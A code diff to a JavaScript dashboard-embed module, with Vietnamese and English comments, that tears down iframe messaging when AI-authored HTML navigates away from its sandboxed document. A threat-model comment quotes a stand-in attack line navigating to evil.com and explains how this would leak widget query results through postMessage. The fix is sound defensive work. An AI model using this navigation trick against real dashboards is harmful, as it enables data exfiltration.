@@ -26,6 +26,7 @@ const EdmPageEmbed = {
 
         let ready = false;
         let disposed = false;
+        let loadCount = 0; // đếm sự kiện `load` của iframe — xem onIframeLoad bên dưới
         const intervals = [];
         const gens = new Map(); // widget_id -> generation, chặn response cũ ghi đè data mới hơn
 
@@ -64,6 +65,7 @@ const EdmPageEmbed = {
         }
 
         const onMessage = (e) => {
+            if (disposed) return;
             if (e.source !== iframe.contentWindow) return;
             if (!e.data || e.data.type !== 'edm:ready') return;
             ready = true;
@@ -86,12 +88,53 @@ const EdmPageEmbed = {
             post();
         }, 5000);
 
+        // teardown(): stops ALL data flow — removes the message listener, clears every
+        // interval/timeout, and flips `disposed`/`ready` so `post()` (including any microtask
+        // already queued via a resolved fetchWidgetData promise) becomes a guaranteed no-op.
+        // Shared by destroy() (owner explicitly closes/switches dashboards) and onIframeLoad
+        // below (hostile in-iframe navigation detected). Idempotent — safe to call twice.
+        function teardown() {
+            if (disposed) return;
+            disposed = true;
+            ready = false;
+            window.removeEventListener('message', onMessage);
+            iframe.removeEventListener('load', onIframeLoad);
+            intervals.forEach(clearInterval);
+            intervals.length = 0;
+            clearTimeout(readyTimeout);
+        }
+
+        // Attack this guards against: the sandbox that protects the AI-authored HTML comes from
+        // the response's CSP header (DashboardPageHeaders.cs), NOT the iframe's `sandbox`
+        // attribute (see file-top comment — the attribute would create an opaque origin at
+        // request time and break cookie-based auth). That header-delivered sandbox applies only
+        // to the document it was served with. If that document runs
+        // `location.href = 'https://evil.com'`, the iframe navigates to a brand-new document
+        // that never received our sandbox header — completely unsandboxed — while this shell
+        // keeps merrily `postMessage(..., '*')`-ing every widget's query results into it once per
+        // refresh tick. That's a live exfiltration channel to whatever origin the attacker
+        // navigated to. Every iframe navigation fires a `load` event; the FIRST one is just the
+        // legit initial document finishing its own load, so only loads after that count as a
+        // navigation-away and trigger teardown.
+        const onIframeLoad = () => {
+            loadCount += 1;
+            if (loadCount <= 1) return; // first load = legit initial document, not a navigation
+            if (disposed) return;
+            teardown();
+            if (typeof onWarning === 'function') {
+                onWarning('Trang dashboard đã điều hướng khỏi tài liệu gốc — đã ngừng bơm dữ liệu vì lý do an toàn.');
+            }
+        };
+        iframe.addEventListener('load', onIframeLoad);
+
         return {
             destroy() {
-                disposed = true;
-                window.removeEventListener('message', onMessage);
-                intervals.forEach(clearInterval);
-                clearTimeout(readyTimeout);
+                // Idempotent: teardown() no-ops if onIframeLoad already tore things down: we
+                // still remove the iframe here every time destroy() is called explicitly. On the
+                // navigation-detected path we deliberately do NOT remove the iframe — it stays
+                // visible (still showing the hostile page) so the user sees the warning next to
+                // something, but no more data ever flows to it.
+                teardown();
                 iframe.remove();
             }
         };
